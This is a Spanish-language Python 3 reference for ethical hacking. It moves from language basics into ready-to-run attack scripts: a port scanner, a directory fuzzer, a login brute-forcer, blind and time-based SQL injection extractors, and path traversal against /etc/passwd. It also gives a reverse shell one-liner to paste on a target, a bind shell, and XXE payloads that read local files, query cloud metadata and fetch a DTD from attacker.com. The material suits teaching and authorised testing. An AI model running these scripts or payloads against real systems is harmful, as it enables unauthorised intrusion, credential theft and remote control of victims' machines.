# Python3 — General y Hacking Ético

Python3 es el lenguaje por excelencia en ciberseguridad: scripting, automatización, exploits, análisis de tráfico y desarrollo de herramientas. Esta referencia cubre lo esencial del lenguaje y su aplicación en hacking ético.

---

## 1. Fundamentos del Lenguaje

### Variables y tipos

```python
# Tipos básicos
nombre   = "Alice"          # str
edad     = 30               # int
pi       = 3.14             # float
activo   = True             # bool
nada     = None             # NoneType
bytes_   = b"datos"         # bytes
ba       = bytearray(b"hi") # bytearray (mutable)

# Colecciones
lista    = [1, 2, 3]        # list (mutable, ordenado)
tupla    = (1, 2, 3)        # tuple (inmutable)
conjunto = {1, 2, 3}        # set (sin duplicados)
diccion  = {"a": 1, "b": 2} # dict

# Comprobación de tipo
type(nombre)                 # <class 'str'>
isinstance(nombre, str)      # True

# Conversiones
int("42")       # 42
str(100)        # "100"
float("3.14")   # 3.14
list("abc")     # ['a', 'b', 'c']
bytes("hola", "utf-8")       # b'hola'
"hola".encode("utf-8")       # b'hola'
b"hola".decode("utf-8")      # 'hola'
```

### Strings

```python
s = "Hack The Box"
len(s)                      # 12
s.lower()                   # "hack the box"
s.upper()                   # "HACK THE BOX"
s.strip()                   # elimina espacios/newlines
s.lstrip("H")               # "ack The Box"
s.replace("Box", "Planet")  # "Hack The Planet"
s.split(" ")                # ['Hack', 'The', 'Box']
" ".join(["a","b","c"])      # "a b c"
s.startswith("Hack")        # True
s.endswith("Box")           # True
s.find("The")               # 5 (-1 si no encuentra)
s.count("a")                # 1
s[0:4]                      # "Hack" (slicing)
s[::-1]                     # reverso
f"Hola {nombre}, tienes {edad} años"  # f-string
"%s tiene %d años" % (nombre, edad)   # formato clásico

# Bytes ↔ Hex (muy usado en hacking)
b"hello".hex()              # "68656c6c6f"
bytes.fromhex("68656c6c6f") # b'hello'
"texto".encode()            # b'texto' (UTF-8 por defecto)

# Base64
import base64
base64.b64encode(b"hola")                    # b'aG9sYQ=='
base64.b64decode("aG9sYQ==")                 # b'hola'
base64.b64decode("aG9sYQ==").decode("utf-8") # 'hola'

# URL encoding
from urllib.parse import quote, unquote, urlencode
quote("hola mundo")         # "hola%20mundo"
quote("a=1&b=2")            # "a%3D1%26b%3D2"
unquote("hola%20mundo")     # "hola mundo"
```

### Listas, diccionarios y sets

```python
# Listas
lst = [3, 1, 4, 1, 5, 9]
lst.append(2)               # añadir al final
lst.insert(0, 0)            # insertar en posición
lst.pop()                   # eliminar y devolver último
lst.pop(0)                  # eliminar posición 0
lst.remove(4)               # eliminar primer valor 4
sorted(lst)                 # nueva lista ordenada
lst.sort(reverse=True)      # ordenar in-place
lst.count(1)                # 2
lst.index(5)                # posición de 5
set(lst)                    # eliminar duplicados

# List comprehension
cuadrados = [x**2 for x in range(10)]
pares     = [x for x in range(20) if x % 2 == 0]
flat      = [item for sub in [[1,2],[3,4]] for item in sub]

# Diccionarios
d = {"user": "admin", "pass": "1234"}
d["role"] = "admin"         # añadir/modificar
d.get("key", "default")     # sin excepción si no existe
d.keys()  / d.values() / d.items()
"user" in d                 # True
del d["pass"]
{k: v for k, v in d.items() if k != "pass"}  # dict comprehension
d.update({"nuevo": "valor"})

# Sets
s1 = {1, 2, 3}
s2 = {2, 3, 4}
s1 | s2    # unión:        {1,2,3,4}
s1 & s2    # intersección: {2,3}
s1 - s2    # diferencia:   {1}
s1 ^ s2    # diferencia simétrica: {1,4}
```

### Control de flujo y funciones

```python
# Condicionales
if x > 0:
    pass
elif x < 0:
    pass
else:
    pass

# Ternario
resultado = "par" if x % 2 == 0 else "impar"

# Bucles
for i in range(10):
    if i == 5: break
    if i == 3: continue
    print(i)

for i, v in enumerate(["a", "b", "c"]):
    print(i, v)         # 0 a, 1 b, 2 c

for k, v in d.items():
    print(k, v)

while condicion:
    pass

# Funciones
def suma(a: int, b: int = 0) -> int:
    return a + b

def variadic(*args, **kwargs):
    print(args)         # tupla de posicionales
    print(kwargs)       # dict de keywords

# Lambda
doble = lambda x: x * 2
lista_ord = sorted(lst, key=lambda x: -x)

# Funcionales
list(map(lambda x: x*2, [1,2,3]))
list(filter(lambda x: x > 2, [1,2,3,4]))
from functools import reduce
reduce(lambda a,b: a+b, [1,2,3,4])  # 10
```

### Manejo de excepciones

```python
try:
    resultado = 10 / 0
except ZeroDivisionError as e:
    print(f"Error: {e}")
except (TypeError, ValueError) as e:
    print(f"Tipo/Valor: {e}")
except Exception as e:
    print(f"General: {e}")
else:
    print("Sin errores")    # solo si no hubo excepción
finally:
    print("Siempre")        # siempre se ejecuta

# Raise
raise ValueError("Mensaje de error")
raise SystemExit(1)
```

---

## 2. Archivos y Sistema

```python
# Leer y escribir archivos
with open("archivo.txt", "r", encoding="utf-8") as f:
    contenido = f.read()           # todo el contenido
    # o
    lineas = f.readlines()         # lista de líneas
    # o
    for linea in f:                # línea a línea (eficiente)
        print(linea.strip())

with open("salida.txt", "w") as f:
    f.write("Hola\n")

with open("log.txt", "a") as f:   # append
    f.write("nueva línea\n")

# Archivos binarios
with open("imagen.png", "rb") as f:
    datos = f.read()

# os y pathlib
import os
from pathlib import Path

os.getcwd()                        # directorio actual
os.listdir("/tmp")                 # listar directorio
os.path.exists("/etc/passwd")
os.path.isfile("/etc/passwd")
os.path.isdir("/etc")
os.path.basename("/etc/passwd")    # "passwd"
os.path.dirname("/etc/passwd")     # "/etc"
os.makedirs("/tmp/a/b/c", exist_ok=True)
os.remove("/tmp/archivo.txt")
os.rename("/tmp/viejo", "/tmp/nuevo")

# pathlib (más moderno)
p = Path("/etc/passwd")
p.exists()
p.read_text()
p.read_bytes()
p.write_text("contenido")
list(Path("/tmp").glob("*.txt"))    # glob
list(Path(".").rglob("*.py"))       # recursivo

# Ejecutar comandos
import subprocess
result = subprocess.run(["ls", "-la"], capture_output=True, text=True)
print(result.stdout)
print(result.returncode)

# Shell=True (cuidado con inyección)
result = subprocess.run("ls -la | grep .py", shell=True, capture_output=True, text=True)

# Ejecutar y obtener salida (simple)
import os
salida = os.popen("id").read()
```

---

## 3. Redes y Sockets

### Sockets básicos

```python
import socket

# Cliente TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.1.1", 80))
sock.send(b"GET / HTTP/1.0\r\nHost: 192.168.1.1\r\n\r\n")
resp = sock.recv(4096)
sock.close()

# Servidor TCP
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", 4444))
server.listen(5)
conn, addr = server.accept()
print(f"Conexión de {addr}")
data = conn.recv(1024)
conn.send(b"Hola\n")
conn.close()

# UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(b"datos", ("192.168.1.1", 53))
data, addr = sock.recvfrom(512)

# Resolución DNS
socket.gethostbyname("google.com")     # IP
socket.getfqdn()                        # FQDN local
socket.gethostname()                    # hostname local
```

### HTTP con requests

```python
import requests

# GET básico
r = requests.get("https://ejemplo.com")
print(r.status_code)       # 200
print(r.text)              # contenido como string
print(r.content)           # contenido como bytes
print(r.headers)           # cabeceras
print(r.cookies)           # cookies

# Con parámetros, headers, cookies
r = requests.get(
    "https://api.ejemplo.com/users",
    params={"page": 1, "limit": 10},
    headers={"Authorization": "Bearer TOKEN", "User-Agent": "Mozilla/5.0"},
    cookies={"session": "abc123"},
    timeout=10,
    verify=False            # ignorar SSL (pentesting)
)

# POST
r = requests.post("https://ejemplo.com/login",
    data={"username": "admin", "password": "pass"},    # form data
    # json={"user": "admin"}                            # JSON body
)

# Sesión persistente (mantiene cookies)
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
s.get("https://ejemplo.com/login")
s.post("https://ejemplo.com/login", data={"user": "admin", "pass": "1234"})
r = s.get("https://ejemplo.com/dashboard")  # autenticado

# Proxy (Burp Suite)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("https://target.com", proxies=proxies, verify=False)
```

---

## 4. Hacking Ético — Scripts y Herramientas

### 4.1 Port Scanner

```python
import socket
import concurrent.futures

def scan_port(host, port, timeout=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        resultado = s.connect_ex((host, port))
        s.close()
        return port if resultado == 0 else None
    except:
        return None

def port_scan(host, start=1, end=1024, threads=100):
    print(f"Escaneando {host} puertos {start}-{end}...")
    abiertos = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futuros = {ex.submit(scan_port, host, p): p for p in range(start, end+1)}
        for f in concurrent.futures.as_completed(futuros):
            res = f.result()
            if res:
                print(f"  [+] Puerto {res} abierto")
                abiertos.append(res)
    return sorted(abiertos)

# Uso
abiertos = port_scan("192.168.1.1", 1, 1024)
```

### 4.2 Fuzzer de Directorios HTTP

```python
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

def fuzz_dir(url, wordlist, threads=20, extensions=None):
    if not url.endswith("/"): url += "/"
    found = []

    def check(word):
        word = word.strip()
        targets = [url + word]
        if extensions:
            targets += [url + word + "." + ext for ext in extensions]
        for target in targets:
            try:
                r = requests.get(target, timeout=5, allow_redirects=False,
                                 verify=False, headers={"User-Agent":"Mozilla/5.0"})
                if r.status_code not in [404, 400, 403]:
                    print(f"  [{r.status_code}] {target}")
                    found.append((r.status_code, target))
            except:
                pass

    with open(wordlist) as f:
        palabras = f.readlines()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        ex.map(check, palabras)

    return found

# Uso
fuzz_dir("http://target.com", "/usr/share/wordlists/dirb/common.txt",
          extensions=["php","txt","html"])
```

### 4.3 Brute Force Login HTTP

```python
import requests

def brute_login(url, user_field, pass_field, username,
                wordlist, success_indicator, proxies=None):
    headers = {"User-Agent": "Mozilla/5.0"}
    with open(wordlist) as f:
        for line in f:
            password = line.strip()
            if not password: continue
            data = {user_field: username, pass_field: password}
            try:
                r = requests.post(url, data=data, headers=headers,
                                  allow_redirects=True, timeout=10,
                                  proxies=proxies, verify=False)
                if success_indicator in r.text:
                    print(f"[+] Contraseña encontrada: {password}")
                    return password
                else:
                    print(f"[-] {password}")
            except Exception as e:
                print(f"[!] Error: {e}")
    print("[-] Contraseña no encontrada")
    return None

# Uso
brute_login(
    url="http://target.com/login",
    user_field="username", pass_field="password",
    username="admin",
    wordlist="/usr/share/wordlists/rockyou.txt",
    success_indicator="Dashboard"
)
```

### 4.4 SQL Injection — Extracción Automática

```python
import requests
import string

# Boolean-based blind SQLi
def blind_sqli_char(url, param, payload_true, payload_false, char_pos, char):
    """Comprueba si el carácter en posición char_pos es char."""
    payload = f"' AND SUBSTRING((SELECT database()),{char_pos},1)='{char}' -- -"
    r = requests.get(url, params={param: payload}, verify=False, timeout=10)
    return payload_true in r.text

def extract_blind(url, param, true_indicator, max_len=32):
    chars = string.ascii_lowercase + string.digits + "_-"
    result = ""
    for pos in range(1, max_len + 1):
        for c in chars:
            payload = f"' AND SUBSTRING((SELECT database()),{pos},1)='{c}'-- -"
            r = requests.get(url, params={param: payload}, verify=False, timeout=5)
            if true_indicator in r.text:
                result += c
                print(f"[+] Char {pos}: {c}  → {result}")
                break
        else:
            break
    return result

# Time-based blind SQLi
def time_sqli(url, param, query, delay=3):
    """Extrae datos usando SLEEP()."""
    payload = f"' AND IF(({query}), SLEEP({delay}), 0)-- -"
    import time
    start = time.time()
    requests.get(url, params={param: payload}, timeout=delay + 5, verify=False)
    elapsed = time.time() - start
    return elapsed >= delay
```

### 4.5 Reverse Shell con Python

```python
# Reverse shell básica
import socket, subprocess, os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# One-liner para pegar en un objetivo
# python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER',4444));[os.dup2(s.fileno(),x) for x in range(3)];subprocess.call(['/bin/sh','-i'])"

# Bind shell
def bind_shell(port=4444):
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    conn, addr = server.accept()
    print(f"Conexión de {addr}")
    import pty
    pty.spawn("/bin/bash")
```

### 4.6 Análisis de Tráfico con Scapy

```python
from scapy.all import *

# Capturar paquetes
packets = sniff(iface="eth0", count=10, filter="tcp port 80")
packets.summary()

# Analizar paquetes
for pkt in packets:
    if pkt.haslayer(Raw):
        print(pkt[Raw].load)

# Crear y enviar paquetes
# SYN scan
ip  = IP(dst="192.168.1.1")
syn = TCP(dport=80, flags="S")
resp = sr1(ip/syn, timeout=2, verbose=False)
if resp and resp[TCP].flags == "SA":
    print("Puerto 80 abierto")

# ICMP ping
resp = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2, verbose=False)
if resp: print(f"Host vivo: {resp.src}")

# DNS query
resp = sr1(IP(dst="8.8.8.8")/UDP()/DNS(rd=1, qd=DNSQR(qname="google.com")))
print(resp[DNS].an.rdata)

# ARP scan
respuestas, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),
                    timeout=2, verbose=False)
for _, rcv in respuestas:
    print(f"{rcv.psrc:20s} {rcv.hwsrc}")
```

### 4.7 Hash Cracking

```python
import hashlib
import itertools

# Identificar tipo de hash por longitud
def guess_hash_type(h):
    tipos = {32:"MD5", 40:"SHA1", 56:"SHA224", 64:"SHA256",
             96:"SHA384", 128:"SHA512"}
    return tipos.get(len(h), "Desconocido")

# Fuerza bruta con diccionario
def crack_hash(target_hash, wordlist, algorithm="md5"):
    h = target_hash.lower()
    with open(wordlist, errors="ignore") as f:
        for line in f:
            word = line.strip()
            digest = hashlib.new(algorithm, word.encode()).hexdigest()
            if digest == h:
                print(f"[+] Encontrado: {word}")
                return word
    return None

# Hash con salt
def crack_salted(target, salt, wordlist, algo="sha256"):
    with open(wordlist, errors="ignore") as f:
        for line in f:
            w = line.strip()
            h = hashlib.new(algo, (salt + w).encode()).hexdigest()
            if h == target:
                return w

# Generar rainbow table pequeña
def rainbow_table(charset, max_len, algo="md5"):
    table = {}
    for length in range(1, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            word = "".join(combo)
            h = hashlib.new(algo, word.encode()).hexdigest()
            table[h] = word
    return table
```

### 4.8 Explotación de Descargas Inseguras / Path Traversal

```python
import requests
import os

# Automatizar path traversal
def path_traversal(base_url, param, target_file, max_depth=8):
    for depth in range(1, max_depth + 1):
        traversal = "../" * depth + target_file.lstrip("/")
        for encoding in [traversal,
                         traversal.replace("../","..%2F"),
                         traversal.replace("/","%2F"),
                         ("..%252F" * depth) + target_file.lstrip("/")]:
            r = requests.get(base_url, params={param: encoding},
                             verify=False, timeout=5)
            if r.status_code == 200 and len(r.text) > 50:
                print(f"[+] ¡Éxito! depth={depth}, encoding={encoding}")
                print(r.text[:500])
                return r.text
    return None

# Uso
path_traversal("http://target.com/download", "file", "/etc/passwd")
```

### 4.9 XML/XXE

```python
# Payload XXE básico para enviar con requests
xxe_payloads = {
    "read_file": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><user>&xxe;</user></data>""",

    "ssrf": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>""",

    "blind_oob": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<data>test</data>""",
}

def send_xxe(url, payload, content_type="application/xml"):
    headers = {"Content-Type": content_type}
    r = requests.post(url, data=payload, headers=headers, verify=False)
    return r.text
```

---

## 5. Criptografía y Codificación

```python
import hashlib, hmac, base64, binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Hashes
hashlib.md5(b"pass").hexdigest()
hashlib.sha1(b"pass").hexdigest()
hashlib.sha256(b"pass").hexdigest()
hashlib.sha512(b"pass").hexdigest()

# HMAC
hmac.new(b"secret", b"mensaje", hashlib.sha256).hexdigest()

# AES (pycryptodome)
key  = b"0123456789abcdef"   # 16 bytes = AES-128
iv   = b"abcdefghijklmnop"   # 16 bytes
data = b"Texto secreto!!!"

# Cifrar AES-CBC
cipher     = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(data, AES.block_size))
print(base64.b64encode(ciphertext).decode())

# Descifrar AES-CBC
cipher    = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
print(plaintext)

# AES-ECB (inseguro, pero común en CTF)
cipher = AES.new(key, AES.MODE_ECB)
ct     = cipher.encrypt(pad(b"test", 16))

# XOR (clásico en CTF)
def xor_bytes(data, key):
    return bytes(a ^ b for a, b in zip(data, (key * (len(data)//len(key)+1))[:len(data)]))

xor_bytes(b"Hello", b"\x1f")       # cifrar/descifrar con byte
xor_bytes(b"\x57\x7a\x73\x73\x60", b"secret")  # clave multi-byte

# ROT13 / César
import codecs
codecs.encode("Hello", "rot_13")    # "Uryyb"
# César genérico
def cesar(text, shift):
    return "".join(
        chr((ord(c) - 65 + shift) % 26 + 65) if c.isupper() else
        chr((ord(c) - 97 + shift) % 26 + 97) if c.islower() else c
        for c in text)
```

---

## 6. Análisis de Archivos Binarios

```python
# Leer estructura de ELF / bytes
with open("binario", "rb") as f:
    data = f.read()

# Magic bytes comunes
magic = {
    b"\x7fELF": "ELF (Linux executable)",
    b"MZ":      "PE (Windows executable)",
    b"\x89PNG": "PNG image",
    b"\xff\xd8\xff": "JPEG image",
    b"PK\x03\x04": "ZIP archive",
    b"7z\xbc\xaf": "7-Zip archive",
}
for magic_bytes, desc in magic.items():
    if data.startswith(magic_bytes):
        print(f"Tipo: {desc}")

# Extraer strings de un binario
def extract_strings(data, min_len=4):
    import re
    pattern = rb"[ -~]{" + str(min_len).encode() + rb",}"
    return [s.decode() for s in re.findall(pattern, data)]

# struct — parsear estructuras binarias
import struct
# Leer entero de 4 bytes little-endian en offset 0
val = struct.unpack_from("<I", data, offset=0)[0]
# Escribir
packed = struct.pack("<IH", 0xdeadbeef, 0x1337)

# Parsear con pwntools (CTF)
from pwn import *
context.arch   = "amd64"
context.os     = "linux"
context.log_level = "debug"

elf = ELF("./binario")
print(hex(elf.entry))
print(hex(elf.sym["main"]))
print(hex(elf.got["puts"]))
print(hex(elf.plt["puts"]))
```

---

## 7. Automatización de Pentesting

```python
# Módulo argparse para herramientas CLI profesionales
import argparse

def parse_args():
    p = argparse.ArgumentParser(description="Mi herramienta de hacking")
    p.add_argument("target",         help="IP o URL del objetivo")
    p.add_argument("-p", "--port",   type=int, default=80, help="Puerto")
    p.add_argument("-w", "--wordlist",required=True, help="Wordlist")
    p.add_argument("-t", "--threads", type=int, default=10)
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("-o", "--output",  help="Archivo de salida")
    return p.parse_args()

# Logging estructurado
import logging
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(), logging.FileHandler("tool.log")]
)
log = logging.getLogger(__name__)
log.info("Iniciando escaneo")
log.warning("Posible falso positivo")
log.error("Error de conexión")

# Colorama — output con colores
from colorama import init, Fore, Style
init()
print(Fore.GREEN  + "[+] Éxito"   + Style.RESET_ALL)
print(Fore.RED    + "[-] Fallo"   + Style.RESET_ALL)
print(Fore.YELLOW + "[!] Warning" + Style.RESET_ALL)
```

---

## 8. Librerías Esenciales para Hacking

| Librería | Uso principal | Instalar |
|---|---|---|
| `requests` | HTTP/S cliente | `pip install requests` |
| `scapy` | Manipulación de paquetes | `pip install scapy` |
| `pwntools` | Exploit dev, CTF | `pip install pwntools` |
| `pycryptodome` | Criptografía | `pip install pycryptodome` |
| `paramiko` | SSH cliente/servidor | `pip install paramiko` |
| `impacket` | Protocolos SMB/AD | `pip install impacket` |
| `beautifulsoup4` | Parsear HTML | `pip install bs4` |
| `sqlalchemy` | ORM / SQL | `pip install sqlalchemy` |
| `colorama` | Colores en terminal | `pip install colorama` |
| `rich` | Output rico | `pip install rich` |
| `click` | CLI framework | `pip install click` |
| `python-nmap` | Wrapper de Nmap | `pip install python-nmap` |

```python
# SSH con paramiko
import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect("192.168.1.1", username="root", password="toor")
stdin, stdout, stderr = ssh.exec_command("id")
print(stdout.read().decode())
ssh.close()

# Parsear HTML con BeautifulSoup
from bs4 import BeautifulSoup
import requests
r   = requests.get("http://target.com")
bs  = BeautifulSoup(r.text, "html.parser")
# Extraer todos los links
links = [a["href"] for a in bs.find_all("a", href=True)]
# Extraer formularios
forms = bs.find_all("form")
for form in forms:
    print(form.get("action"), form.get("method"))
    inputs = form.find_all("input")
    for inp in inputs:
        print(f"  {inp.get('name')} [{inp.get('type')}]")

# Nmap desde Python
import nmap
nm = nmap.PortScanner()
nm.scan("192.168.1.0/24", "22-443", "-sV -O")
for host in nm.all_hosts():
    print(f"{host} - {nm[host].state()}")
    for proto in nm[host].all_protocols():
        for port in nm[host][proto]:
            s = nm[host][proto][port]
            print(f"  {port}/{proto} {s['state']} {s['name']} {s['version']}")
```
